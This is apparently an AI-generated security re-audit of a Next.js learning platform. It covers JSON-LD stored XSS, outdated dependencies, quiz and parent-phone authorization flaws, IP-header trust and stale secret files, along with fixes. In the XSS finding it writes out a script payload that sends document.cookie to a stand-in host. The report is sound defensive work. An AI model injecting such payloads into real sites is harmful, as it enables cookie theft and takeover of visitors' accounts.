# Code-UP — Security Re-Audit (2026-09-03)

**Target:** `Thefake` / code-up.tech — Next.js 16 App Router, Prisma, PostgreSQL 16, PM2 2-worker cluster, single EC2 origin behind Cloudflare.
**Scope:** Full 10-phase review — architecture, authN/authZ, all 230 API route handlers (spot-sampled), DB/query layer, secrets & config, dependencies, business logic.
**Method:** Manual source review + `npm audit` + pattern sweeps (raw SQL, `child_process`, `dangerouslySetInnerHTML`, unauth'd outbound `fetch`, IP-header trust). No exploitation was run against the production host.
**Baseline:** Builds on `SECURITY-AUDIT-2026-08.md` and commit `c843856` (16 fixes). Money-handling, session lifecycle, and payment-webhook posture from that pass were re-checked and still hold.

---

## Executive summary

The core that the last audit hardened is still solid: wallet debits are atomic, payment webhooks re-verify server-side and are idempotent, auth uses keyed HMAC phone challenges + `tokenVersion` revocation + pre-bcrypt lockout, and the DRM/video access gate is fail-closed. No new money or account-takeover bug was found.

The new findings are concentrated in **content-injection** and **dependency freshness**:

| # | Severity | Title |
|---|----------|-------|
| 1 | **HIGH** | Stored XSS via JSON-LD injection on public teacher & course pages |
| 2 | **HIGH** | `next` 16.2.7 — App Router middleware/proxy-bypass + Server-Function disclosure advisories |
| 3 | **HIGH** | `axios` 1.7.9 — multiple SSRF / prototype-pollution CVEs in server-side HTTP client |
| 4 | MEDIUM | `checkQuizAccess`: any teacher can read any plan-lesson quiz + answer key |
| 5 | MEDIUM | Student can re-point the parent-monitoring phone at will |
| 6 | MEDIUM | Unconditional trust of client IP headers (`cf-connecting-ip` / `x-forwarded-for`) |
| 7 | MEDIUM | `next-auth` / `@auth/core` — **critical** Auth.js advisory in an **unused** dependency |
| 8 | MEDIUM | Stale plaintext secret snapshots (`.env.save*`) in the app directory |
| 9–16 | LOW | See "Low / hardening" |
| 17 | MEDIUM | `admin/students/[id]/balance` — non-atomic wallet write, no cap, `admin` role mints with no action-password, audit-log was superadmin-only |
| 18 | LOW | `homework/[id]/file` — unescaped filename in `Content-Disposition` header |
| 19 | LOW | `homework/[id]/upload` — no extension restriction when a homework has no `allowedFileTypes` |

---

## Remediation status — 2026-09-03

Applied to the working tree in this pass (no `npm install` / build / deploy run on the live host — see "Deploy" below):

| # | Status | What changed |
|---|--------|--------------|
| 1 XSS | **fixed** | new `src/lib/jsonld.ts::safeJsonLd()` (encodes `< > &`); applied at all 6 `application/ld+json` sinks (`layout.tsx`, `HomeContent.tsx`, `courses/[id]/page.tsx`, `[teacherSlug]/page.tsx`, `curriculum/page.tsx`, `curriculum/programming-and-ai/page.tsx`) |
| 2 next | **staged** | `package.json` `next` `^16.2.6` → `^16.3.4` (patched line, still 16.x). Needs `npm install` + build + deploy |
| 3 axios | **staged** | `package.json` `axios` `1.7.9` → `^1.20.0`. Needs `npm install` |
| 4 checkQuizAccess | **fixed** | `src/lib/authorization.ts` — plan-lesson branch now requires a `PlanLessonSource` for that teacher |
| 5 parent-phone | **fixed** | `src/app/api/student/parent-phone/route.ts` — self-service blocked once `parentVerified`/`CONFIRMED`; `allowSamePhone` no longer read from a student body; generic error message |
| 6 IP-header trust | **open** | needs infra work (Cloudflare Authenticated Origin Pulls or a secret origin header) — not a code-only fix; see finding |
| 7 next-auth | **staged** | `package.json` — `next-auth` dependency removed (was unused; also drops the transitive `@auth/core` critical). Needs `npm install` |
| 8 `.env.save*` | **fixed** | moved to `~/.env-backups/stale-repo-snapshots/` (out of the repo tree, mode 700). **Still TODO: rotate any secret in those snapshots not rotated since June** — `JWT_SECRET`, `SUPERADMIN_*`, `CONFIG_ENCRYPTION_KEY`, `WALLET_PASSWORD`, `BULK_DELETE_PASSWORD`, Twilio, Bunny, VdoCipher |
| 10 newScore bounds | **fixed** | `grade-requests/[id]` — `newScore` must be a finite number in `[0, 100]` |
| 11 error leakage | **partial** | fixed on `student/parent-phone`; ~15 other routes still echo `error.message` — sweep separately |
| structural default-deny | **fixed (partial)** | `src/proxy.ts` `PROTECTED_API_PREFIXES` now also covers `/api/teacher`, `/api/student`, `/api/homework`, `/api/notifications` (verified: no public endpoints in those groups). `/api/admin` left out (has `admin/login`); `/api/ai` left out (`ai/status` is public) |
| 17 balance route | **fixed** | `admin/students/[id]/balance` — atomic conditional `increment` (was read-then-write), `Number.isFinite` + 100 000 EGP/call cap, `logAdminAction` now fires for **every** manual adjustment. *Still recommended: add `verifyWalletPassword` gate and/or restrict to `superadmin`.* |
| 18 Content-Disposition | **fixed** | `homework/[id]/file` — filename sanitised for the header + RFC 5987 `filename*` + explicit `nosniff` |
| 19 upload ext | **fixed** | `homework/[id]/upload` — server-executable extensions (`php`, `sh`, `jsp`, `asp`, …) rejected even with no per-homework allow-list |
| input validation | **fixed** | `feedback` POST — `content` ≤ 4000, `rating` must be integer 1–5 (was stored raw); `tickets` POST — `title` ≤ 200 / `description` ≤ 5000, `priority` clamped to `{low,normal,high,urgent}` so a crafted value can't sort above real urgent tickets |

**Verification run:** `npx tsc --noEmit` — the 5 pre-existing errors (`TeachersSection.tsx`, `DrmPlayer.tsx`) are unchanged; **the edits introduce zero new type errors**. `npm run test:security` was **not** run here (it exercises concurrent wallet/enrollment writes against `DATABASE_URL`, i.e. the live Postgres) — run it in a non-prod environment.

**Deploy (do on the host, in a quiet window — not mid-lesson):**
```bash
cd ~/Thefake && npm install            # applies #2 #3 #7 + refreshes lockfile
npm audit fix                          # sharp / postcss / js-yaml / nanoid / brace-expansion / browserslist
npm audit                              # expect 0 critical, 0 high (bar the tracked prisma build-time one)
npm run test:security                  # 23/23
npx tsc --noEmit                       # then start deleting the 5 pre-existing errors so #9 can go
./update.sh                            # build + pm2 reload
```
Building on this 2 vCPU / ~1.7 GB-free box under live traffic can OOM `next build` — reload pm2 only after a clean build, or build on a matching instance and ship `.next`.

---

## New this pass — findings 17–19

### 17 — MEDIUM · `admin/students/[id]/balance` — wallet adjustment weaknesses  ·  *fixed*

`POST /api/admin/students/[id]/balance` (credit/debit a student wallet) had four problems:

1. **Non-atomic** — `read balance → newBalance = balance + amount → write newBalance`. Two concurrent admin adjustments, or one racing a purchase/webhook, silently lose an update (last-writer-wins on an absolute value), breaking the wallet-consistency invariant the webhook paths carefully keep with `increment`.
2. **No amount bound** — any finite `amount` accepted (`1e12`, etc.); only `0` / falsy rejected.
3. **`admin` role, no action-password** — `["admin","superadmin"].includes(role)` with no `verifyRoleActionPassword` / `verifyWalletPassword`, so any `admin`-role session mints unlimited balance. The RBAC matrix doesn't even define a balance permission.
4. **Audit gap** — `logAdminAction` fired only for `superadmin`; an `admin` adjustment left only the `BalanceTransaction` row.

**Fixed:** atomic conditional `updateMany` + `increment` inside the transaction (debit only applies if `balance >= |amount|`), `Number.isFinite` + `MAX_ADJUSTMENT = 100_000` per call, `logAdminAction("CREDIT|DEBIT_STUDENT_BALANCE", …)` on every call.
**Still recommended:** gate with `verifyWalletPassword` (the helper already exists) and consider `superadmin`-only.
**Test:** two parallel `-50` calls on a 60-balance student → final balance 10, not −40; `amount: 1e9` → 400; every call produces an `ActivityLog` row.

### 18 — LOW · `homework/[id]/file` — header injection via filename  ·  *fixed*

`Content-Disposition: attachment; filename="${path.basename(fileName)}"` — `path.basename` stops path traversal but leaves `"`, `;`, and control chars, so a crafted `?fileName=` breaks the header param (full CRLF response-splitting is blocked by the platform's header validation, but the quoted param still breaks). **Fixed:** ASCII filename sanitised to `[\w.\- ]`, plus `filename*=UTF-8''<encoded>` for the real name, plus an explicit `X-Content-Type-Options: nosniff` on the response.

### 19 — LOW · `homework/[id]/upload` — unrestricted type with no per-homework allow-list  ·  *fixed*

When a homework had no `allowedFileTypes`, any extension was accepted. Files are stored outside the webroot and only served as authenticated attachments, so impact was low, but **fixed** by always rejecting server-executable extensions (`php*`, `sh`, `bash`, `cgi`, `jsp`, `asp*`, `exe`, `bat`, `cmd`, `com`). `.js` / `.py` / `.html` are still allowed — this is a programming course and the serving model makes them safe.

---

## Also verified clean this pass (no action needed)

- **Referral farming** — `ReferralService.registerPendingReferral` rejects `inviterId === invitedId` and one referral record per invited user; `qualifyAndRewardReferral` is `PENDING`→`REWARDED` atomic, points only.
- **AI data isolation** — `buildStudentContext(studentId)` scopes every query to `where: { studentId }` / `{ id: studentId }`; the chat AI is context-stuffed, not tool-calling with DB access, so a prompt-injected message cannot reach another student's data.
- **`verifyAlaslyWebhookSignature`** — fails closed on missing secret or header; HMAC-SHA256 constant-time compare.
- **`payments/sha7nawy/confirm`** (client-callable) — re-verifies against the gateway, pending-tx lookup scoped to `userId: session.id`, amount re-checked, atomic single-winner claim, credits only the server-stored base amount.
- **`admin/students/[id]/reset-devices`, `student/results/[id]`, `student/[id]/profile`, `homework/[id]` (GET/DELETE), `grade-requests/[id]`, `tickets/[id]`** — ownership checks correct.

*Side note:* `src/lib/rbac.ts` has no `"edit_teachers"` / `"delete_teachers"` in the `Permission` type, but `TeachersSection.tsx` calls `hasPermission(role, "edit_teachers")` — those calls always return `false` (2 of the 5 pre-existing `tsc` errors). Client-side only; the API routes enforce `role === "superadmin"` independently, so it's a UI bug, not an authz hole. Worth cleaning up alongside #9.

Structural note: `src/proxy.ts` (the Next 16 middleware) only 401s a **prefix allow-list** of API routes. ~200 handlers under `/api/{teacher,student,admin,payments,parent,ai,...}` rely entirely on their own `getSession()` call. ~30 sampled across every group were correctly gated, but the pattern is one forgotten line away from an open endpoint — add a default-deny (see Phase 3).

---

## Phase 1 — Architecture map

- **Entry:** Cloudflare (proxied, "Full" not "Full-Strict") → single EC2 origin (ports 80/443 restricted to Cloudflare ranges) → Next.js via PM2 cluster (2 workers) → PostgreSQL on `127.0.0.1`.
- **Auth:** custom JWT (`jose`, HS256) in `auth_token` httpOnly cookie. No `next-auth` in the code path. `src/proxy.ts` does coarse page/API gating on Edge; `src/lib/auth.ts::getSession()` does the authoritative per-request check (DB-backed, `tokenVersion`, 10 s LRU cache).
- **Roles:** `student`, `teacher`, `admin`, `staff`, `superadmin` (+ `isOwner` break-glass, + `accountMode: TESTER` bypass).
- **Money:** wallet `balance` on `User`; `BalanceTransaction` ledger with indexed `providerRef`; gateways Sha7nawy + Shake-Out; server-authoritative pricing in `src/lib/price-verifier.ts`.
- **Content gating:** `src/lib/authorization.ts` (`checkCourseEnrollment` / `checkVideoAccess` / `checkQuizAccess` / `checkHomeworkAccess`) + `src/lib/content-access-engine.ts` (sequential unlock).
- **Video:** VdoCipher / Bunny / Axinom DRM / native ("alasly" + Google Drive proxy) / YouTube. DRM proxy `/api/videos/drm/[...slug]` enforces path containment + extension allow-list + `checkVideoAccess`.
- **Sensitive assets (rank order):** wallet balances → paid-video/DRM keys → exam/quiz integrity → student & parent PII (phone, IP, UA) → gateway/AI/video-provider API keys.

---

## Phase 8 — Findings (severity-ranked)

### 1 — HIGH · Stored XSS via JSON-LD injection on public pages

```
Severity : HIGH
Location : src/app/[teacherSlug]/page.tsx:139
           src/app/courses/[id]/page.tsx:303
Type     : Stored XSS (CWE-79) — data breakout from <script type="application/ld+json">
```

**Attack**

1. Attacker owns (or is given) a `teacher` account.
2. `PATCH /api/admin/profile` with
   `displayName = </script><script>fetch('https://evil.tld/x?c='+document.cookie)</script>`
   (`src/app/api/admin/profile/route.ts:23` — `displayName`/`bio` are free-text, only length-trimmed; there is **no** HTML sanitisation anywhere in the repo — `grep -ri dompurify|sanitize-html` = 0 hits).
3. Any visitor opens `https://code-up.tech/<slug>`. The page renders:

   ```jsx
   <script type="application/ld+json"
     dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
   ```

   `JSON.stringify` does **not** escape `<`, `>`, `/`, `U+2028`, `U+2029`. The browser's HTML tokenizer ends the script at the literal `</script>` regardless of JSON string context, then executes the injected node.

Same vector on `/courses/[id]` via `course.title` / `course.description` (`PATCH /api/admin/courses/[id]` — `description` only capped at `MAX_DESCRIPTION_LENGTH`).

**Impact**

Runs in the origin of `code-up.tech` for **every visitor**, including logged-out users and students, on unauthenticated pages. `auth_token` is httpOnly (not readable via `document.cookie`), but the payload can still: drive same-origin authenticated API calls as the victim (cookie auth, no CSRF token anywhere), keylog the `/login` form, deface, or redirect to phishing. On a student visitor this is effectively full account misuse.

**Evidence**

- `src/app/[teacherSlug]/page.tsx:104-124` builds `jsonLd` with `"name": name` (`name = p.displayName ?? p.teacher.name`) and `"description": p.bio`.
- `src/app/courses/[id]/page.tsx:300-311` builds it with `"name": course.title`, `"description": course.description`.
- No escaping between `JSON.stringify` and `dangerouslySetInnerHTML`.
- `src/app/layout.tsx:234-238` uses the same sink but with a **static** object — currently safe, still fix for consistency. `curriculum/*` pages: static, low priority.

**Fix**

Add one helper and use it at every `application/ld+json` sink:

```ts
// src/lib/jsonld.ts
export function safeJsonLd(obj: unknown): string {
  return JSON.stringify(obj)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/ /g, "\\u2028")
    .replace(/ /g, "\\u2029");
}
```

```jsx
dangerouslySetInnerHTML={{ __html: safeJsonLd(jsonLd) }}
```

Defence in depth: move CSP `script-src` to a nonce and drop `'unsafe-inline'` (see #12).

**Test**

Set a teacher `displayName` to `</script><img src=x onerror="window.__xss=1">`, load `/<slug>`, assert `window.__xss === undefined` and that the `ld+json` block contains `</script>`.

---

### 2 — HIGH · `next` 16.2.7 is behind on security patches

```
Severity : HIGH
Location : package.json  ("next": "^16.2.6", installed 16.2.7)
Type     : Vulnerable dependency (SSRF, middleware bypass, endpoint disclosure)
```

`npm audit` flags `next` **high**, advisories including:

- **"Middleware / Proxy bypass in App Router applications"** — directly relevant: `src/proxy.ts` is the only thing enforcing auth on `/dashboard`, `/library`, `/courses/*/learn`, `/adminpanel/*` and the `/api/{courses,plans,videos,library,quizzes,progress}` prefixes. A middleware-bypass CVE turns those redirects into no-ops.
- "Unauthenticated disclosure of internal Server Function endpoints."
- SSRF in Server Actions / rewrites; image-optimisation DoS via SVG.

`fixAvailable: true`, non-major (a `16.2.x` bump).

**Fix** — `npm i next@latest` within 16.2.x (or the current 16.x patch), redeploy, re-run `npm audit`.
**Test** — `npm run build` + `npm run test:security` must stay green; manually confirm `/dashboard` still 302s to `/login` when logged out.

---

### 3 — HIGH · `axios` 1.7.9 — SSRF / prototype-pollution cluster

```
Severity : HIGH
Location : package.json  ("axios": "1.7.9")
Type     : Vulnerable dependency
```

`axios` is `transpilePackages`'d and used for server-side outbound HTTP. `npm audit` lists ~30 advisories against 1.7.9 (absolute-URL SSRF, `NO_PROXY` bypass SSRF, several prototype-pollution → credential-injection / request-hijack gadgets, DoS). Fix is **non-major**: `axios@^1.20.0`.

**Fix** — bump to `axios@^1.20.0`, `npm audit` clean for axios, smoke-test payment + WhatsApp + AI outbound paths.

---

### 4 — MEDIUM · `checkQuizAccess` — any teacher reads any plan-lesson quiz (with answer key)

```
Severity : MEDIUM
Location : src/lib/authorization.ts:88-93
Type     : Broken function-level authorization / IDOR (cross-tenant)
```

```ts
if (role === "teacher") {
  return (
    (quiz.folder?.course?.teacherId === userId) ||
    (quiz.planLessonId !== null)          // <-- not scoped to this teacher
  );
}
```

The second clause is `true` for **every** plan-lesson quiz, for **every** teacher. Called by `GET /api/quizzes/[id]` (`src/app/api/quizzes/[id]/route.ts:33`), which for non-students returns `quiz.questions` **including `correctAnswer`** (students get it stripped at line 116-120). `POST /api/quizzes/[id]/submit` uses the same gate.

**Attack** — Teacher A calls `GET /api/quizzes/<any-plan-lesson-quizId>` and receives the full question set and answer key for study-plan assessments they don't own.

**Impact** — Cross-tenant disclosure of assessment content / answer keys. No PII or money. Contained to plan-lesson quizzes (folder/course quizzes owned by other teachers correctly return `false`).

**Fix** — scope the plan branch to ownership:

```ts
if (role === "teacher") {
  if (quiz.folder?.course?.teacherId === userId) return true;
  if (quiz.planLessonId) {
    return !!(await prisma.planLessonSource.findFirst({
      where: { planLessonId: quiz.planLessonId, teacherId: userId }, select: { id: true },
    }));
  }
  return false;
}
```

(`grade-requests/[id]/route.ts:55-58` already does exactly this check — reuse that shape.)

**Test** — Teacher B (no source on the lesson) gets 403 from `GET /api/quizzes/<planLessonQuizId>`; Teacher A (owns a `PlanLessonSource`) gets 200.

---

### 5 — MEDIUM · Student controls the parent-monitoring channel

```
Severity : MEDIUM
Location : src/app/api/student/parent-phone/route.ts:20-53
Type     : Business-logic / safety-control bypass
```

`POST /api/student/parent-phone` with only `{ parentPhone, allowSamePhone: true }`:

- `targetStudentId` defaults to `session.id` (self).
- `reissueParentToken(session.id, parentPhone, ..., { allowSamePhone: allowSamePhone || isAdmin })` — the client's `allowSamePhone` is honoured for non-admins.

A student can therefore (re)issue the permanent parent portal link to **their own** number at any time, before or after verification, defeating `requireParentVerification` and any "parent flagged this student" state. `resetParentVerificationLimits` stays admin-only, but re-issuing to a fresh attacker-controlled number sidesteps the counter anyway.

**Fix** — after the first successful parent verification, require `role in (admin, superadmin, staff)` (or a re-verification flow) to change `parentPhone`; never let `allowSamePhone` come from the request body for a student caller. Also gate this route to `session.role === "student"` for the self path. Log every parent-phone change to `parentVerificationEvents`.

**Test** — verified student calling `parent-phone` with a new number gets 403; admin call still succeeds.

---

### 6 — MEDIUM · Unconditional trust of client-supplied IP headers

```
Severity : MEDIUM (conditional on origin reachability off-Cloudflare)
Location : src/lib/vpn-guard.ts  (getClientIp / isVpnOrProxy)
```

`getClientIp` returns `cf-connecting-ip` → `x-real-ip` → `x-forwarded-for` with no check that the immediate peer is actually Cloudflare. Origin ports 80/443 are currently locked to Cloudflare ranges, so this holds *today* — but if that SG rule ever drifts, or a request originates from inside the box (SSRF, SSM tunnel, localhost tooling), an attacker sets `CF-Connecting-IP: 1.1.1.1` and:

- bypasses VPN/proxy detection in `proxy.ts`,
- resets/forges the per-IP rate limits on `/api/parent/portal` and `AccessCodeGuard`,
- writes attacker-chosen IPs into `activityLog` / `parentVerificationEvents` (audit poisoning).

**Fix** — trust `CF-Connecting-IP` only when `request.ip` / socket peer is in Cloudflare's published ranges; otherwise fall back to the socket address. Better: enable Cloudflare **Authenticated Origin Pulls** or a secret `X-Origin-Auth` header checked in `proxy.ts`, and reject any direct-to-origin request.

**Test** — request to origin with spoofed `CF-Connecting-IP` from a non-CF source is treated with the real socket IP; VPN gate still triggers.

---

### 7 — MEDIUM · Critical advisory in an unused `next-auth` dependency

```
Severity : MEDIUM (no known code path; still shipped)
Location : package.json  ("next-auth": "^5.0.0-beta.31"), @auth/core 0.41.2
```

`npm audit` marks `next-auth` / `@auth/core` **critical** ("Auth.js: configuration errors can cause existence-based auth checks to fail open"; homoglyph email-normaliser bypass; `getToken()` uncaught throw). `grep -rn "next-auth\|@auth/core\|NextAuth\|getServerSession" src` returns **nothing** — the app rolls its own `jose` auth.

**Fix** — remove `next-auth` and `@auth/core` from `dependencies`, `npm i`, confirm `npm run build` + `test:security`. This deletes both "critical" rows from the audit.

---

### 8 — MEDIUM · Stale plaintext secret snapshots in the app directory

```
Severity : MEDIUM
Location : /home/ec2-user/Thefake/.env.save , .env.save.1 , .env.save.2  (Jun 2026)
```

`.gitignore` covers them and git history is clean, but three 2.5-month-old full env snapshots sit next to the live `.env` (mode 600). Any local-file-read bug, backup/rsync of the project dir, or `tar czf` for support hands over a complete (possibly un-rotated) secret set: `JWT_SECRET`, `CONFIG_ENCRYPTION_KEY`, gateway `*_SECRET_KEY` / `*_WEBHOOK_SECRET`, `GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY`, video-provider keys, superadmin passwords.

**Fix** — `shred -u .env.save*` (or move outside the repo tree into `~/.env-backups`, which already exists). Confirm every secret that appears in those files has been rotated since June; if not, rotate now — start with `JWT_SECRET` (rotating it also invalidates any leaked break-glass token) and the two gateway webhook secrets. The existing `HANDOFF.md` already flags a GitHub token on the old server for rotation — same exercise.

---

## Low / hardening

| # | Location | Issue | Fix |
|---|----------|-------|-----|
| 9 | `next.config.ts:59` | `typescript.ignoreBuildErrors: true` — auth/authorization type-confusion bugs ship silently | run `tsc --noEmit` in CI as a blocking gate; drop the flag |
| 10 | `src/app/api/grade-requests/[id]/route.ts:74-83` | `newScore` written with no numeric/range validation → rogue teacher sets arbitrary quiz scores (feeds leaderboards) | `if (typeof newScore !== "number" || newScore < 0 || newScore > 100) 400` |
| 11 | ~16 route handlers | return raw `error.message` / `error?.message` to the client (e.g. `student/parent-phone:70`) | return a generic string; log the detail server-side only |
| 12 | `next.config.ts:18-28` | CSP `script-src 'unsafe-inline'` (no nonce) — removes the layer that would blunt finding #1 | migrate Next inline bootstrap to nonce-based CSP; drop `'unsafe-inline'` |
| 13 | `src/lib/distributed-lock.ts:33` | `$executeRawUnsafe(\`SELECT pg_advisory_xact_lock(${lockId})\`)` — `lockId` is a derived int today (not injectable) but a fragile pattern | `tx.$executeRaw\`SELECT pg_advisory_xact_lock(${lockId})\`` (parameterised) |
| 14 | `src/lib/admin-auth.ts:32-41` | `timingSafeCompare` returns early on length mismatch → leaks secret length via timing (low: high-entropy admin secrets) | hash both sides first, like `src/lib/secret-compare.ts` already does |
| 15 | `src/lib/cooldown.ts` (in-mem Map) used by OTP send + rate limits | not shared across the 2 PM2 workers → effective limits ~2× intended | move cooldown/rate state to Postgres or a shared store |
| 16 | `src/lib/admin-auth.ts:100-121` | `verifyVdoCipherSecurityPassword` compares against a **plaintext** password in `platformConfig` | store a hash; compare with a constant-time hashed compare |

---

## Verified good (do not re-spend effort here)

- **Payment webhooks** (`payments/sha7nawy/webhook`, `payments/shakeout/webhook`): mandatory `secretsMatch` (hashed, constant-time), refuse when secret unset, server-side re-verification against the gateway, amount + client match, atomic single-winner `updateMany` claim, idempotent "already credited" paths.
- **Wallet / codes:** balance debits are `updateMany where balance >= price`; access-codes, plan-codes, money-codes all redeemed via conditional `updateMany where <unused>` inside a transaction. Race-safe (matches `test:security` #10, #11, #14-16).
- **Auth:** `jose` HS256, `alg:"none"` rejected by construction (symmetric key), httpOnly + `Secure`-by-default cookies, `tokenVersion` global revocation, login lockout evaluated **before** `bcrypt.compare`, HMAC-keyed single-use phone challenges with attempt caps.
- **Video/DRM:** `checkVideoAccess` teacher branch correctly scoped; DRM proxy enforces `resolvedPath.startsWith(DRM_DIR + sep)` + extension allow-list + fail-closed auth.
- **Injection:** Prisma throughout; no `$queryRawUnsafe`/`$executeRawUnsafe` with user input; `spawnSync` in `teacher/drm-package` uses array args (no shell) with `path.basename` on the filename.
- **SSRF:** Google Drive helpers pin the host to `www.googleapis.com` with `encodeURIComponent(fileId)`; AI/gateway base URLs are env- or superadmin-configured, not request-controlled.
- **Webhook `alasly`:** signature-checked; even if bypassed it only writes `durationMinutes`.

---

## Phase 3 — endpoint-coverage note & recommendation

`src/proxy.ts` 401s only: `/api/library`, `/api/quizzes`, `/api/progress`, `/api/auth/complete-profile`, `/api/videos/*`, `/api/courses*` (non-public), `/api/plans*` (non-public). Everything else authenticates **only** in the handler. Sampled and confirmed correctly gated: `admin/*` (inline `role`/`hasPermission` + `return`), `teacher/*` (`session.id` scoping), `student/[id]/*` and `student/results/[id]` (ownership `!== session.id → 403`), `parent/portal` (token + IP rate-limit + phone masking), `cron/*` (`CRON_SECRET` bearer), `codes` (role block + `AccessCodeGuard` rate limit + atomic redemption).

**Recommendation:** in `proxy.ts`, after the existing rules, add:

```ts
if (pathname.startsWith("/api/") && !isPublicApi(pathname) && !authed) {
  return NextResponse.json({ error: "غير مصرح" }, { status: 401 });
}
```

with `isPublicApi` an explicit allow-list (`/api/auth/login`, `/api/auth/signup`, `/api/auth/forgot-password`, `/api/auth/phone/send-code`, `/api/auth/logout`, `/api/webhooks/*`, `/api/payments/*/webhook`, `/api/cron/*`, `/api/health`, `/api/site-text`, `/api/payments/methods`, `/api/parent/*`, `/api/security/vpn-check`, `/api/courses` + `/api/courses/*/preview`, `/api/plans` + `/api/plans/[id]`). Turns "forgot a check" from an open endpoint into a 401.

---

## Phase 6 — `npm audit` (16: 2 critical, 11 high, 2 moderate, 1 low)

| Package | Sev | Action | Major? |
|---|---|---|---|
| `next` 16.2.7 | high | `next@latest` (16.2.x) | no |
| `next-auth` / `@auth/core` | **critical** | **remove** (unused) — see #7 | n/a |
| `axios` 1.7.9 | high | `axios@^1.20.0` | no |
| `sharp` 0.34.5 | high | `npm audit fix` | no |
| `postcss`, `js-yaml`, `nanoid`, `brace-expansion`, `browserslist` | high | `npm audit fix` (transitive/build-time DoS) | no |
| `protobufjs`, `qs` | moderate | `npm audit fix` | no |
| `esbuild` | low | dev-server, Windows-only — defer | no |
| `prisma` / `@prisma/config` (`deepmerge-ts`) | high | build-time only; fix wants prisma 6.12.0 (down/side-grade). Track, don't rush | yes-ish |

---

## Phase 9 — fix order

1. **#8** — shred `.env.save*`; rotate `JWT_SECRET`, gateway webhook secrets, anything else in those snapshots not rotated since June. *(minutes, no deploy)*
2. **#1** — add `safeJsonLd()`, apply at all 3 dynamic `ld+json` sinks. *(1 file + 3 edits)*
3. **#2 / #3 / #7 / sharp+transitive** — `remove next-auth @auth/core`, `next@latest`, `axios@^1.20.0`, `npm audit fix`; `npm run build && npm run test:security && npx tsc --noEmit`. *(one PR)*
4. **#4** — scope the `checkQuizAccess` plan branch to `PlanLessonSource.teacherId`.
5. **#5** — lock parent-phone changes behind admin / re-verification; stop honouring client `allowSamePhone`.
6. **#6** — Cloudflare-only origin trust (Authenticated Origin Pulls or secret header) + IP-header trust fix.
7. **#3 proxy default-deny** + low/hardening #9–#16.

## Phase 10 — retest

- `npm run test:security` (23/23) must stay green after every step.
- `npx tsc --noEmit` clean (and make it blocking in CI — #9).
- `npm audit` → 0 critical, 0 high (except the tracked prisma build-time one).
- New regression tests: XSS breakout on `/[slug]` (#1); Teacher-B 403 on foreign plan-lesson quiz (#4); student 403 on `parent-phone` change post-verification (#5); spoofed `CF-Connecting-IP` from non-CF peer ignored (#6); unauthenticated `/api/teacher/analytics` → 401 from middleware (proxy default-deny).

---

*Generated by Claude Code (Sonnet 5) on 2026-09-03. Manual source review; no dynamic exploitation was performed against the production host. Treat this document as sensitive — it enumerates live, unpatched issues.*
